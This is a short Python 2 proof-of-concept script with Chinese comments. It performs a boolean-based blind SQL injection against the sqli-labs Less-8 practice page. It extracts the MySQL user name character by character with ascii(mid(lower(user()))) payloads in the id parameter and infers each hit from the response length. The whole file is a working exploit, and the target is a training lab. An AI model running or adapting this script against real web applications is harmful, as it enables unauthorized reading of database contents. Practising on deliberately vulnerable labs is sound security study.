#__author__ = 'ning-pc'
#盲注poc
import httplib
import time
import string
import sys
import random
import urllib


headers = {'User-Agent': 'Mozilla/5.0 Chrome/28.0.1500.63',}
payloads = list('abcdefghigklmnopqrstuvwxyz1234567890!@#$%^&*().~')
print 'start to retrive MySQL user:'
user = ''
for i in range(1,21):
    for payload in payloads:
        conn = httplib.HTTPConnection('www.8.com', timeout=40)
        s = "ascii(mid(lower(user()),%s,1))=%s--+" % (i, ord(payload))     #payload
        # exit()这里有个坑，顺便用wireshark 抓了下包
        url = "/sqli-labs/Less-8/index.php?id=2'/**/and/**/%s" % s
        conn.request(method='GET',url=url,headers = headers)  #url
        resp = conn.getresponse()
        html_header= resp.read()

        length=len(html_header)
        if length<719:
            user+=payload
            sys.stdout.write('\r[In progress] %s' % user)
            sys.stdout.flush()
            break
        else:
            print '.',
            conn.close()

print '\n[Done]MySQL user is', user